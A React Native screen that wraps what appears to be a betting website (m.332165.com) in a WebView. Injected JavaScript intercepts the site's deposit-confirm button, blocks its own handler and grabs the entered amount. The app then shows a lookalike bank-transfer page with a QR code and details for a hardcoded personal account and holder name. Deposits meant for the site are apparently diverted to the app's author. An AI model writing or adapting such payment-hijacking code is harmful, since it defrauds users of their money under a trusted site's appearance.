import { useCallback, useState } from "react";
import {
  Alert,
  Image,
  Linking,
  Pressable,
  ScrollView,
  StyleSheet,
  Text,
  View,
} from "react-native";
import { SafeAreaView } from "react-native-safe-area-context";
import { WebView } from "react-native-webview";

const supportUrl = "https://example.com/support";

const BANK_INFO = {
  bankId: "Techcombank",
  bankName: "Techcombank",
  accountNumber: "6545666668",
  accountHolder: "PHAM THE BAO",
  transferNote: "UNG HO NHA PHAT TRIEN",
  template: "compact2",
};

type DepositInfo = {
  amountDisplay: string;
  amountValue: string;
  rawAmount: string;
};

const BANK_OPTIONS = [
  { key: "nab", label: "NAM A BANK", image: require("../qrcode/images/nab.png") },
  { key: "bidv", label: "BIDV", image: require("../qrcode/images/bidv.png") },
  { key: "msb", label: "MSB", image: require("../qrcode/images/msb.png") },
  { key: "stb", label: "SACOMBANK", image: require("../qrcode/images/stb.png") },
  { key: "vietbank", label: "VIETBANK", image: require("../qrcode/images/vietbank.png") },
  { key: "vietcombank", label: "VIETCOMBANK", image: require("../qrcode/images/vcb.png") },
];

export default function WebViewScreen() {
  const [depositInfo, setDepositInfo] = useState<DepositInfo | null>(null);

  const formatMoneyInt = (money = 0, type = ".") => {
    return String(money).replace(/(\d)(?=(\d{3})+(?!\d))/g, `$1${type}`);
  };

  const buildTransferContent = (rawAmount: string) => {
    const safeNote = `${BANK_INFO.transferNote} ${rawAmount}`
      .replace(/[^a-zA-Z0-9\s]/g, " ")
      .replace(/\s+/g, " ")
      .trim();
    return safeNote.slice(0, 50);
  };

  const buildVietQrUrl = (info: DepositInfo) => {
    const transferContent = buildTransferContent(info.rawAmount);
    return `https://img.vietqr.io/image/${BANK_INFO.bankId}-${BANK_INFO.accountNumber}-${BANK_INFO.template}.png?amount=${info.amountValue}&addInfo=${encodeURIComponent(
      transferContent
    )}&accountName=${encodeURIComponent(BANK_INFO.accountHolder)}`;
  };

  const isActiveBankOption = (bankKey: string, bankLabel: string) => {
    const normalizedBankId = BANK_INFO.bankId.toLowerCase();
    const normalizedBankName = BANK_INFO.bankName.toLowerCase();
    return (
      normalizedBankId.includes(bankKey) ||
      normalizedBankName.includes(bankKey) ||
      normalizedBankName.includes(bankLabel.toLowerCase())
    );
  };

  const handleWebViewMessage = useCallback(async (event: any) => {
    const message = event.nativeEvent.data;

    if (message.startsWith("DEBUG_LOG:")) {
      console.log("WebView Log:", message.replace("DEBUG_LOG:", ""));
      return;
    }

    try {
      const data = JSON.parse(message);

      if (data.action === "confirm_deposit_clicked") {
        const rawAmountNum = Number(data.amount);

        if (!rawAmountNum || rawAmountNum <= 0) {
          Alert.alert("Thông báo", "Số tiền nạp không hợp lệ. Vui lòng kiểm tra lại.");
          return;
        }

        const finalAmountValue = rawAmountNum;
        const amountFormatted = formatMoneyInt(finalAmountValue, ",");

        setDepositInfo({
          amountDisplay: `${amountFormatted} VND`,
          amountValue: String(finalAmountValue),
          rawAmount: data.amount,
        });
      }

      if (data.action === "line_chat_clicked") {
        const canOpen = await Linking.canOpenURL(supportUrl);
        if (canOpen) await Linking.openURL(supportUrl);
      }
    } catch {
      console.log("Non-JSON message:", message);
    }
  }, []);

  const injectedJS = `
    (function() {
      try {
        function emitToApp(action, data) {
          if (!window.ReactNativeWebView) return;
          window.ReactNativeWebView.postMessage(JSON.stringify(Object.assign({ action: action }, data || {})));
        }

        function normalizeText(text) {
          return (text || "")
            .toUpperCase()
            .normalize("NFD")
            .replace(/[\u0300-\u036f]/g, "")
            .replace(/\s+/g, " ")
            .trim();
        }

        function parseAmount(rawText) {
          var text = String(rawText || "").toUpperCase().replace(/\s+/g, "");
          if (!text) return "0";

          var unit = "";
          if (/K$/.test(text)) unit = "K";
          if (/M$/.test(text)) unit = "M";

          text = text.replace(/[^0-9.,]/g, "");
          if (!text) return "0";

          var normalized = text;
          if (text.indexOf(",") > -1 && text.indexOf(".") > -1) {
            normalized = text.replace(/,/g, "");
          } else if (text.indexOf(",") > -1) {
            normalized = text.replace(/,/g, "");
          }

          var value = Number(normalized);
          if (!value || value <= 0) return "0";

          if (unit === "K") value = value * 1000;
          if (unit === "M") value = value * 1000000;

          return String(Math.round(value));
        }

        function getAmountFromDom() {
          var selectors = [
            'input[placeholder*="tiền"]',
            'input[placeholder*="Tiền"]',
            'input[placeholder*="money"]',
            'input[type="number"]',
            'input[type="text"]',
            '.ui-input__input',
            '.amount input',
            '[class*="amount"] input'
          ];

          for (var i = 0; i < selectors.length; i++) {
            var input = document.querySelector(selectors[i]);
            if (input && input.value) {
              var parsed = parseAmount(input.value);
              if (parsed !== "0") return parsed;
            }
          }

          var activeSelectors = [
            ".active",
            '[class*="active"]',
            '[class*="selected"]',
            '[class*="checked"]'
          ];

          for (var j = 0; j < activeSelectors.length; j++) {
            var node = document.querySelector(activeSelectors[j]);
            if (node) {
              var parsedNode = parseAmount(node.textContent || node.innerText || "");
              if (parsedNode !== "0") return parsedNode;
            }
          }

          return "0";
        }

        function isConfirmButton(el) {
          if (!el) return false;
          var text = normalizeText(el.textContent || el.innerText || "");
          if (text === "Xâc nhận nạp tiền" || text === "Xâc nhận nạp tiền" || text === "XAC  NHAN NAP TIEN") return true;
          if (el.classList && (el.classList.contains("confimeButton") || el.classList.contains("confirmButton"))) return true;
          return false;
        }

        function handleConfirmClick(event) {
          var target = event.target;
          var buttonEl = target && target.closest
            ? target.closest('.confimeButton, .confirmButton, button, [role="button"], a, div, span')
            : target;

          if (!isConfirmButton(buttonEl)) return true;

          if (window.__rnConfirmLock) {
            event.preventDefault();
            event.stopPropagation();
            if (event.stopImmediatePropagation) event.stopImmediatePropagation();
            return false;
          }

          window.__rnConfirmLock = true;
          setTimeout(function() {
            window.__rnConfirmLock = false;
          }, 1500);

          event.preventDefault();
          event.stopPropagation();
          if (event.stopImmediatePropagation) event.stopImmediatePropagation();

          var amount = getAmountFromDom();
          emitToApp("confirm_deposit_clicked", { amount: amount });
          return false;
        }

        function handleLineChatClick(event) {
          var target = event.target;
          var el = target && target.closest ? target.closest(".line-chat") : null;
          if (!el) return true;

          event.preventDefault();
          event.stopPropagation();
          if (event.stopImmediatePropagation) event.stopImmediatePropagation();
          emitToApp("line_chat_clicked", {});
          return false;
        }

        function attachListeners() {
          var elements = document.querySelectorAll('button, div, span, a, [role="button"]');
          elements.forEach(function(el) {
            if (!isConfirmButton(el) || el.dataset.rnConfirmHandled === "1") return;
            el.dataset.rnConfirmHandled = "1";
            el.addEventListener("click", handleConfirmClick, { capture: true, passive: false });
            el.addEventListener("touchstart", handleConfirmClick, { capture: true, passive: false });
            el.addEventListener("mousedown", handleConfirmClick, { capture: true, passive: false });
          });

          var lineChatElements = document.querySelectorAll(".line-chat");
          lineChatElements.forEach(function(el) {
            if (el.dataset.rnLineHandled === "1") return;
            el.dataset.rnLineHandled = "1";
            el.addEventListener("click", handleLineChatClick, { capture: true, passive: false });
            el.addEventListener("touchstart", handleLineChatClick, { capture: true, passive: false });
            el.addEventListener("mousedown", handleLineChatClick, { capture: true, passive: false });
          });
        }

        attachListeners();
        var observer = new MutationObserver(attachListeners);
        observer.observe(document.body, { childList: true, subtree: true });
        setInterval(attachListeners, 1200);
      } catch (e) {
        if (window.ReactNativeWebView) {
          window.ReactNativeWebView.postMessage("DEBUG_LOG:" + e.message);
        }
      }
    })();
    true;
  `;

  return (
    <SafeAreaView style={styles.container}>
      {depositInfo ? (
        <ScrollView style={styles.paymentScreen} contentContainerStyle={styles.paymentContent}>
          <View style={styles.paymentHeader}>
            <Text style={styles.paymentHeaderText}>Thanh toán bằng Chuyển khoản</Text>
          </View>

          <View style={styles.paymentCard}>
            <View style={styles.bankLogosRow}>
              {BANK_OPTIONS.slice(0, 4).map((bank) => {
                const active = isActiveBankOption(bank.key, bank.label);
                return (
                  <View key={bank.key} style={[styles.bankLogoItem, active && styles.bankLogoItemActive]}>
                    <Image source={bank.image} style={styles.bankLogoImage} />
                    <Text style={[styles.bankLogoText, active && styles.bankLogoTextActive]}>{bank.label}</Text>
                  </View>
                );
              })}
              <View style={styles.bankMoreItem}>
                <Text style={styles.bankMoreText}>{">"}</Text>
              </View>
            </View>

            <View style={styles.methodCard}>
              <Text style={styles.methodTitle}>Cách 1: Chuyển khoản bằng mã QR</Text>
              <Text style={styles.methodDescription}>Mở ứng dụng ngân hàng và quét QRCode</Text>

              <Image source={require("../qrcode/assets/qr.png")} style={styles.shbetLogo} resizeMode="contain" />

              <View style={styles.qrFrame}>
                <Image source={{ uri: buildVietQrUrl(depositInfo) }} style={styles.qrImage} resizeMode="contain" />
              </View>

              <Text style={styles.napasInfo}>napas 247 | {BANK_INFO.bankName.toUpperCase()}</Text>
              <View style={styles.downloadButton}>
                <Text style={styles.downloadButtonText}>Tải Xuống Mã QR</Text>
              </View>
              <Text style={styles.supportAppsText}>40 App ngân hàng hỗ trợ quét mã</Text>
            </View>

            <View style={styles.methodCard}>
              <Text style={styles.methodTitle}>
                Cách 2: Chuyển khoản <Text style={styles.methodTitleHighlight}>thủ công</Text> theo thông tin
              </Text>

              <View style={styles.infoRow}><Text style={styles.infoRowLabel}>Ngân hàng</Text><Text style={styles.infoRowValue}>{BANK_INFO.bankName}</Text></View>
              <View style={styles.infoRow}><Text style={styles.infoRowLabel}>Số TK</Text><Text style={styles.infoRowValue}>{BANK_INFO.accountNumber}</Text></View>
              <View style={styles.infoRow}><Text style={styles.infoRowLabel}>Chủ TK</Text><Text style={styles.infoRowValue}>{BANK_INFO.accountHolder}</Text></View>
              <View style={styles.infoRow}><Text style={styles.infoRowLabel}>Số tiền</Text><Text style={[styles.infoRowValue, styles.amountText]}>{depositInfo.amountDisplay}</Text></View>
              <View style={styles.infoRowLast}><Text style={styles.infoRowLabel}>Nội dung</Text><Text style={styles.infoRowValue}>{buildTransferContent(depositInfo.rawAmount)}</Text></View>
            </View>

            <View style={styles.noticeCard}>
              <Text style={styles.noticeTitle}>Lưu ý</Text>
              <Text style={styles.noticeText}>
                Không đổi số tiền và nội dung chuyển khoản nếu bạn muốn đối soát tự động.
              </Text>
            </View>
          </View>

          <Pressable style={styles.primaryButton} onPress={() => setDepositInfo(null)}>
            <Text style={styles.primaryButtonText}>Tôi đã chuyển khoản</Text>
          </Pressable>

          <Pressable style={styles.secondaryButton} onPress={() => setDepositInfo(null)}>
            <Text style={styles.secondaryButtonText}>Quay lại trang nạp tiền</Text>
          </Pressable>
        </ScrollView>
      ) : (
        <WebView
          source={{ uri: "https://m.332165.com/" }}
          javaScriptEnabled={true}
          domStorageEnabled={true}
          injectedJavaScript={injectedJS}
          startInLoadingState={true}
          scalesPageToFit={true}
          style={styles.webview}
          onMessage={handleWebViewMessage}
        />
      )}
    </SafeAreaView>
  );
}

const styles = StyleSheet.create({
  container: { flex: 1, backgroundColor: "#fff" },
  webview: { flex: 1 },
  paymentScreen: { flex: 1, backgroundColor: "#eef3f8" },
  paymentContent: { padding: 20, gap: 14 },
  paymentHeader: {
    backgroundColor: "#e8f1ff",
    borderRadius: 16,
    paddingVertical: 14,
    paddingHorizontal: 18,
    borderWidth: 1,
    borderColor: "#d0e0ed",
  },
  paymentHeaderText: { fontSize: 16, fontWeight: "700", color: "#0b72e7", textAlign: "center" },
  paymentCard: { backgroundColor: "#fff", borderRadius: 18, padding: 20, borderWidth: 1, borderColor: "#d9e3ef" },
  bankLogosRow: {
    flexDirection: "row",
    alignItems: "flex-start",
    justifyContent: "space-between",
    backgroundColor: "#fbfdff",
    borderWidth: 1,
    borderColor: "#e3e8ef",
    borderRadius: 14,
    paddingVertical: 14,
    paddingHorizontal: 10,
    marginBottom: 20,
  },
  bankLogoItem: { alignItems: "center", flex: 1, paddingHorizontal: 4 },
  bankLogoItemActive: { transform: [{ translateY: -1 }] },
  bankLogoImage: {
    width: 38,
    height: 38,
    borderRadius: 19,
    borderWidth: 1,
    borderColor: "#e5e7eb",
    marginBottom: 6,
    backgroundColor: "#fff",
  },
  bankLogoText: { fontSize: 10, color: "#64748b", textAlign: "center" },
  bankLogoTextActive: { color: "#0f172a", fontWeight: "700" },
  bankMoreItem: { width: 28, alignItems: "center", justifyContent: "center", paddingTop: 8 },
  bankMoreText: { fontSize: 18, color: "#94a3b8", fontWeight: "700" },
  methodCard: {
    backgroundColor: "#f8fafc",
    borderWidth: 1,
    borderColor: "#e2e8f0",
    borderRadius: 16,
    padding: 18,
    marginBottom: 16,
  },
  methodTitle: { fontSize: 17, fontWeight: "700", color: "#0f172a", marginBottom: 8, lineHeight: 24 },
  methodTitleHighlight: { color: "#0b72e7", textDecorationLine: "underline" },
  methodDescription: { fontSize: 13, color: "#64748b", marginBottom: 14 },
  shbetLogo: { width: 118, height: 48, alignSelf: "center", marginBottom: 12 },
  qrFrame: {
    alignSelf: "center",
    backgroundColor: "#fff",
    borderRadius: 14,
    padding: 10,
    borderWidth: 1,
    borderColor: "#e2e8f0",
    marginBottom: 12,
  },
  qrImage: { width: 220, height: 220 },
  napasInfo: {
    textAlign: "center",
    fontSize: 13,
    color: "#475569",
    fontWeight: "700",
    marginBottom: 12,
    textTransform: "uppercase",
  },
  downloadButton: {
    alignSelf: "center",
    backgroundColor: "#0b72e7",
    borderRadius: 10,
    paddingVertical: 10,
    paddingHorizontal: 18,
    marginBottom: 10,
  },
  downloadButtonText: { color: "#fff", fontSize: 14, fontWeight: "700" },
  supportAppsText: { textAlign: "center", color: "#0b72e7", fontSize: 12, textDecorationLine: "underline" },
  infoRow: {
    flexDirection: "row",
    alignItems: "flex-start",
    paddingVertical: 10,
    borderBottomWidth: 1,
    borderBottomColor: "#dbe4f0",
    gap: 12,
  },
  infoRowLast: { flexDirection: "row", alignItems: "flex-start", paddingTop: 10, gap: 12 },
  infoRowLabel: { width: 76, fontSize: 13, color: "#64748b" },
  infoRowValue: { flex: 1, fontSize: 15, color: "#0f172a", fontWeight: "700" },
  amountText: { color: "#dc2626" },
  noticeCard: { backgroundColor: "#eff6ff", borderRadius: 16, padding: 16, borderWidth: 1, borderColor: "#bfdbfe" },
  noticeTitle: { fontSize: 15, fontWeight: "700", color: "#1d4ed8", marginBottom: 6 },
  noticeText: { fontSize: 14, lineHeight: 20, color: "#1e3a8a" },
  primaryButton: { backgroundColor: "#dc2626", borderRadius: 18, paddingVertical: 14, alignItems: "center" },
  primaryButtonText: { color: "#fff", fontSize: 16, fontWeight: "700" },
  secondaryButton: {
    borderRadius: 18,
    paddingVertical: 14,
    alignItems: "center",
    backgroundColor: "#fff",
    borderWidth: 1,
    borderColor: "#cbd5e1",
  },
  secondaryButtonText: { color: "#0f172a", fontSize: 15, fontWeight: "600" },
});
